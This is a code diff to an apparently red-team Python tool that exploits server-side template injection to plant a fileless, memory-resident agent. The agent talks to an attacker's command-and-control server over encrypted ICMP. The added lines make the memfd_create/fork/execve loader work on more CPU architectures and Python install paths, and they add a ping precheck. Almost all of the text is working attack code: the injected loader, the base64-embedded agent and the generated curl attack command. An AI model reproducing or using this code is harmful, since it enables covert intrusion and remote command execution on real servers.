@@ -29,6 +29,8 @@ import urllib.parse
 import hashlib
 import ctypes
 import ctypes.util
+import subprocess
+import platform
 
 # ═══════════════════════════════════════════════════════════════
 #  Protocol Constants
@@ -57,7 +59,7 @@ MSG_RESULT    = 0x03         # agent → C2: chunked command output
 # ═══════════════════════════════════════════════════════════════
 AGENT_CODE = r'''#!/usr/bin/env python3
 """ICMP C2 Agent — fileless, memory-resident, AES-256-CTR encrypted"""
-import socket, struct, os, subprocess, time, random, sys
+import socket, struct, os, subprocess, time, random, sys, platform
 import ctypes, ctypes.util, hashlib
 
 C2 = "__C2_IP__"
@@ -350,18 +352,46 @@ def send_command(sock, target_ip: str, cmd: str, seq: int) -> int:
 #
 # ═══════════════════════════════════════════════════════════════
 
+def _get_memfd_syscall_nr() -> int:
+    """Auto-detect memfd_create syscall number by architecture."""
+    machine = platform.machine()
+    syscall_map = {
+        'x86_64':  319,
+        'aarch64': 279,
+        'armv7l':  385,
+        'i686':    356,
+        'i386':    356,
+    }
+    nr = syscall_map.get(machine)
+    if nr is None:
+        print(f"[!] 未知架構 {machine}，預設使用 x86_64 memfd_create syscall #319")
+        nr = 319
+    return nr
+
+def _find_python3_path() -> str:
+    """Find python3 binary path for use in loader execve."""
+    for p in ['/usr/bin/python3', '/usr/local/bin/python3', '/bin/python3']:
+        if os.path.isfile(p):
+            return p
+    # fallback: use sys.executable (works on most systems)
+    return '/usr/bin/env python3'
+
+
 def generate_ssti_payload(attacker_ip: str) -> str:
     """Build the complete SSTI payload string."""
     # Inject C2 IP into agent source code
     agent_src = AGENT_CODE.replace('__C2_IP__', attacker_ip)
     agent_b64 = base64.b64encode(agent_src.encode()).decode()
 
+    # Auto-detect memfd_create syscall number
+    memfd_nr = _get_memfd_syscall_nr()
+
     # Loader script — the "dropper" that runs in the popen subprocess.
     #
-    # ctypes.CDLL(None).syscall(319, b"", 0):
+    # ctypes.CDLL(None).syscall(memfd_nr, b"", 0):
     #   - CDLL(None) loads libc (the C standard library)
-    #   - .syscall(319, ...) invokes the raw Linux syscall interface
-    #   - 319 is memfd_create on x86_64 (see: ausyscall --dump | grep memfd)
+    #   - .syscall(memfd_nr, ...) invokes memfd_create via raw syscall
+    #   - syscall number is architecture-dependent (auto-detected)
     #   - b"" is the name (empty string, shows as "memfd:" in /proc)
     #   - 0 is flags (no MFD_CLOEXEC, so fd survives execve)
     #
@@ -370,20 +400,23 @@ def generate_ssti_payload(attacker_ip: str) -> str:
     #   - Parent exits immediately (so popen finishes and Flask responds)
     #   - Child is re-parented to init (PID 1) — becomes a daemon
     #
-    # os.execve("/usr/bin/python3", [..., "/proc/<pid>/fd/<N>"], env):
-    #   - Replaces the child process with python3
-    #   - python3 opens /proc/<pid>/fd/<N>, reads the memfd content,
-    #     and executes it as a Python script
-    #   - After execve, the old Python interpreter is gone; the new one
-    #     has no knowledge of how it was launched
+    # python3_path auto-detected:
+    #   - Checks /usr/bin/python3, /usr/local/bin/python3, etc.
+    #   - Ensures execve works on different Ubuntu installations
     loader = (
-        'import ctypes,os,base64\n'
+        'import ctypes,os,base64,platform\n'
         f'c=base64.b64decode("{agent_b64}")\n'
-        'fd=ctypes.CDLL(None).syscall(319,b"",0)\n'
+        # Auto-detect syscall number on target side too
+        '_m={"x86_64":319,"aarch64":279,"armv7l":385,"i686":356}\n'
+        '_nr=_m.get(platform.machine(),319)\n'
+        'fd=ctypes.CDLL(None).syscall(_nr,b"",0)\n'
         'os.write(fd,c)\n'
+        # Auto-detect python3 path on target
+        'import shutil\n'
+        '_py=shutil.which("python3") or "/usr/bin/python3"\n'
         'p=os.fork()\n'
         'if p==0:\n'
-        '    os.execve("/usr/bin/python3",'
+        '    os.execve(_py,'
         '["python3","/proc/"+str(os.getpid())+"/fd/"+str(fd)],'
         'dict(os.environ))\n'
     )
@@ -581,6 +614,17 @@ class C2Server:
 #  Main
 # ═══════════════════════════════════════════════════════════════
 
+def _icmp_precheck(target_ip: str) -> bool:
+    """Quick ICMP reachability test before starting C2."""
+    try:
+        result = subprocess.run(
+            ['ping', '-c', '2', '-W', '2', target_ip],
+            capture_output=True, timeout=10)
+        return result.returncode == 0
+    except Exception:
+        return False
+
+
 def main():
     p = argparse.ArgumentParser(description='Red Team Fileless ICMP C2')
     p.add_argument('--target', '-t', required=True, help='Target IP')
@@ -590,6 +634,8 @@ def main():
                    help='Target app port (default 9999)')
     p.add_argument('--payload-only', action='store_true',
                    help='Only print the SSTI curl command, then exit')
+    p.add_argument('--skip-check', action='store_true',
+                   help='Skip ICMP connectivity pre-check')
     args = p.parse_args()
 
     if args.payload_only:
@@ -599,6 +645,23 @@ def main():
     if os.geteuid() != 0:
         print("[!] Raw ICMP socket requires root.  Run with: sudo")
         sys.exit(1)
+
+    # ── ICMP 連通性預檢 ──
+    if not args.skip_check:
+        print("\n[*] ICMP 連通性預檢...")
+        if _icmp_precheck(args.target):
+            print(f"  ✅ {args.target} ICMP 可達")
+        else:
+            print(f"  ❌ {args.target} ICMP 不可達!")
+            print(f"  → C2 使用 ICMP 傳輸指令，目標必須可 ping 通")
+            print(f"  → 檢查: UFW / iptables / 雲端安全組是否封鎖 ICMP")
+            print(f"  → 詳細檢查: sudo bash red_team/check_connectivity.sh {args.target} {args.lhost}")
+            print(f"  → 強制跳過: 加上 --skip-check 參數")
+            sys.exit(1)
+
+    # ── 架構資訊 ──
+    memfd_nr = _get_memfd_syscall_nr()
+    print(f"  ℹ️  memfd_create syscall #{memfd_nr} ({platform.machine()})")
 
     print("\n\033[93m[*] SSTI attack command (paste into another terminal):\033[0m\n")
     print(f"  {generate_curl_command(args.target, args.port, args.lhost)}\n")
